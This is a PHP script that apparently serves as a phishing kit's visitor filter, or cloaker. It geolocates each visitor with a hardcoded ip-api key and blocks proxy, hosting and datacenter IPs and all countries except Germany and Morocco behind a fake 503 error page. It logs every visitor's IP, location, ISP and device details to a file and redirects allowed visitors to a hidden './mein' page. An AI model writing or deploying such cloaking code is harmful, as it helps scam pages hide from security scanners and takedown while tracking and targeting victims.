<?php
$URL = "./mein";

session_start();
error_reporting(0);

function getVisitorIP() {
    foreach (['HTTP_CF_CONNECTING_IP', 'HTTP_X_FORWARDED_FOR', 'REMOTE_ADDR'] as $header) {
        if (!empty($_SERVER[$header])) return trim(explode(',', $_SERVER[$header])[0]);
    }
    return "UNKNOWN";
}

function checkIP($ip) {
    $apiKey = "6Dc0S679WvFlAyA"; 
    $allowedCountries = ['DE','MA']; 

    if ($ip === '127.0.0.1' || $ip === '::1') {
        return [
            'status' => 'allowed', 
            'country_code' => 'Local', 
            'city' => 'Localhost', 
            'region' => 'Local',
            'zip' => '00000',
            'isp' => 'Local Network',
            'org' => 'Local Network',
            'reason' => 'CLEAN IP'
        ];
    }

    $url = "https://pro.ip-api.com/json/{$ip}?key={$apiKey}&fields=status,countryCode,regionName,city,zip,isp,org,proxy,hosting";
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    $response = curl_exec($ch);
    curl_close($ch);

    $ipDetails = json_decode($response, true);

    if (empty($ipDetails) || $ipDetails['status'] !== 'success') {
        return [
            'status' => 'blocked', 
            'country_code' => 'N/A', 
            'city' => 'API Error', 
            'region' => 'N/A',
            'zip' => 'N/A',
            'isp' => 'N/A',
            'org' => 'N/A',
            'reason' => 'API FAILED'
        ];
    }

    $isProxy = $ipDetails['proxy'] ?? false;
    $isHosting = $ipDetails['hosting'] ?? false;
    $countryCode = $ipDetails['countryCode'] ?? 'N/A';
    
    $result = [
        'country_code' => $countryCode,
        'city' => $ipDetails['city'] ?? 'N/A',
        'region' => $ipDetails['regionName'] ?? 'N/A',
        'zip' => $ipDetails['zip'] ?? 'N/A',
        'isp' => $ipDetails['isp'] ?? 'N/A',
        'org' => $ipDetails['org'] ?? 'N/A'
    ];

    if ($isProxy || $isHosting) {
        $result['status'] = 'blocked';
        $result['reason'] = $isProxy ? 'PROXY DETECTED' : 'HOSTING IP';
    } elseif (!in_array($countryCode, $allowedCountries)) {
        $result['status'] = 'blocked';
        $result['reason'] = 'COUNTRY NOT ALLOWED';
    } else {
        $result['status'] = 'allowed';
        $result['reason'] = 'CLEAN IP';
    }

    return $result;
}

function detectDeviceDetails() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
    $userAgentLower = strtolower($userAgent);
    
    $deviceType = 'Desktop';
    $deviceBrand = 'Unknown';
    $os = 'Unknown';
    $browser = 'Unknown';
    
    // OS Detection
    $osPatterns = [
        '/windows nt 10/' => 'Windows 10/11', '/windows nt 6.3/' => 'Windows 8.1',
        '/windows nt 6.2/' => 'Windows 8', '/windows nt 6.1/' => 'Windows 7',
        '/windows nt 6.0/' => 'Windows Vista', '/windows nt 5.2/' => 'Windows Server 2003',
        '/windows nt 5.1/' => 'Windows XP', '/windows nt 5.0/' => 'Windows 2000',
        '/windows phone/' => 'Windows Phone', '/windows/' => 'Windows',
        '/mac os x 14_/' => 'macOS Sonoma', '/mac os x 13_/' => 'macOS Ventura',
        '/mac os x 12_/' => 'macOS Monterey', '/mac os x 11_/' => 'macOS Big Sur',
        '/mac os x 10_/' => 'macOS', '/macintosh/' => 'macOS',
        '/ubuntu/' => 'Ubuntu', '/debian/' => 'Debian', '/fedora/' => 'Fedora',
        '/redhat|rhel/' => 'Red Hat', '/centos/' => 'CentOS', '/suse/' => 'SUSE',
        '/linux mint/' => 'Linux Mint', '/arch linux/' => 'Arch Linux', '/linux/' => 'Linux',
        '/android 14/' => 'Android 14', '/android 13/' => 'Android 13', '/android 12/' => 'Android 12',
        '/android 11/' => 'Android 11', '/android 10/' => 'Android 10', '/android 9/' => 'Android 9',
        '/android/' => 'Android', '/iphone os 17_/' => 'iOS 17', '/iphone os 16_/' => 'iOS 16',
        '/iphone os 15_/' => 'iOS 15', '/iphone os 14_/' => 'iOS 14', '/iphone|ipad|ipod/' => 'iOS'
    ];
    
    foreach ($osPatterns as $pattern => $osName) {
        if (preg_match($pattern, $userAgentLower)) {
            $os = $osName;
            break;
        }
    }
    
    // Device Brand
    $brandPatterns = [
        '/samsung/' => 'Samsung', '/iphone|ipad|ipod/' => 'Apple', '/huawei/' => 'Huawei',
        '/xiaomi|redmi|poco/' => 'Xiaomi', '/oppo/' => 'Oppo', '/vivo/' => 'Vivo',
        '/realme/' => 'Realme', '/oneplus/' => 'OnePlus', '/google/' => 'Google',
        '/sony/' => 'Sony', '/lg/' => 'LG', '/htc/' => 'HTC', '/motorola/' => 'Motorola',
        '/nokia/' => 'Nokia', '/blackberry/' => 'BlackBerry', '/lenovo/' => 'Lenovo',
        '/asus/' => 'ASUS', '/acer/' => 'Acer', '/dell/' => 'Dell', '/hp/' => 'HP',
        '/microsoft/' => 'Microsoft', '/amazon/' => 'Amazon', '/alcatel/' => 'Alcatel'
    ];
    
    foreach ($brandPatterns as $pattern => $brand) {
        if (preg_match($pattern, $userAgentLower)) {
            $deviceBrand = $brand;
            break;
        }
    }
    
    // Device Type
    $mobilePatterns = ['mobile', 'android', 'iphone', 'ipad', 'ipod', 'blackberry'];
    foreach ($mobilePatterns as $pattern) {
        if (strpos($userAgentLower, $pattern) !== false) {
            $deviceType = 'Mobile';
            break;
        }
    }
    
    if (strpos($userAgentLower, 'tablet') !== false || strpos($userAgentLower, 'ipad') !== false) {
        $deviceType = 'Tablet';
    }
    
    if (strpos($userAgentLower, 'server') !== false || strpos($userAgent, 'Apache') !== false) {
        $deviceType = 'Server';
    }
    
    // Browser
    $browserPatterns = [
        '/chrome/' => 'Chrome', '/firefox/' => 'Firefox', '/safari/' => 'Safari',
        '/edge|edg/' => 'Edge', '/opera/' => 'Opera', '/ie |msie/' => 'IE',
        '/vivaldi/' => 'Vivaldi', '/brave/' => 'Brave'
    ];
    
    foreach ($browserPatterns as $pattern => $browserName) {
        if (preg_match($pattern, $userAgentLower)) {
            $browser = $browserName;
            break;
        }
    }
    
    return [
        'device_type' => $deviceType,
        'device_brand' => $deviceBrand,
        'os' => $os,
        'browser' => $browser,
        'user_agent' => substr($userAgent, 0, 200)
    ];
}

function getCompanyFromISP($isp) {
    $isp = trim($isp);
    $companyPatterns = [
        '/(ionos|1&1)/i' => 'IONOS', '/(amazon|aws)/i' => 'Amazon AWS',
        '/(google|gcp)/i' => 'Google Cloud', '/(microsoft|azure)/i' => 'Microsoft Azure',
        '/(digitalocean|do)/i' => 'DigitalOcean', '/(linode|akamai)/i' => 'Linode',
        '/(ovh)/i' => 'OVH', '/(hetzner)/i' => 'Hetzner', '/(hostinger)/i' => 'Hostinger',
        '/(bluehost)/i' => 'Bluehost', '/(godaddy)/i' => 'GoDaddy', '/(namecheap)/i' => 'Namecheap'
    ];
    
    foreach ($companyPatterns as $pattern => $company) {
        if (preg_match($pattern, $isp)) {
            return $company;
        }
    }
    
    $words = explode(' ', $isp);
    if (count($words) > 1) {
        return implode(' ', array_slice($words, 0, 2));
    }
    
    return $isp;
}

function logVisitor($visitorData) {
    $logFile = 'visitors.json';
    $logData = [];

    if (file_exists($logFile)) {
        $logData = json_decode(file_get_contents($logFile), true);
        if (!is_array($logData)) {
            $logData = [];
        }
    }

    array_unshift($logData, $visitorData);
    file_put_contents($logFile, json_encode($logData, JSON_PRETTY_PRINT));
}

$visitorIP = getVisitorIP();
$ipCheckResult = checkIP($visitorIP);
$deviceDetails = detectDeviceDetails();
$company = getCompanyFromISP($ipCheckResult['org'] ?: $ipCheckResult['isp']);

$logEntry = [
    "ip" => $visitorIP,
    "country" => $ipCheckResult['country_code'],
    "city" => $ipCheckResult['city'],
    "region" => $ipCheckResult['region'],
    "zip" => $ipCheckResult['zip'],
    "isp" => $ipCheckResult['isp'],
    "org" => $ipCheckResult['org'],
    "company" => $company,
    "status" => $ipCheckResult['status'],
    "reason" => $ipCheckResult['reason'],
    "device_type" => $deviceDetails['device_type'],
    "device_brand" => $deviceDetails['device_brand'],
    "os" => $deviceDetails['os'],
    "browser" => $deviceDetails['browser'],
    "user_agent" => $deviceDetails['user_agent'],
    "timestamp" => date("Y-m-d H:i:s")
];

logVisitor($logEntry);

if ($ipCheckResult['status'] === 'blocked') {
    header('HTTP/1.1 503 Service Temporarily Unavailable'); 
    die("HTTP/1.1 503 Service Temporarily Unavailable");
} else {
    header("Location: $URL");
    die();
}
?>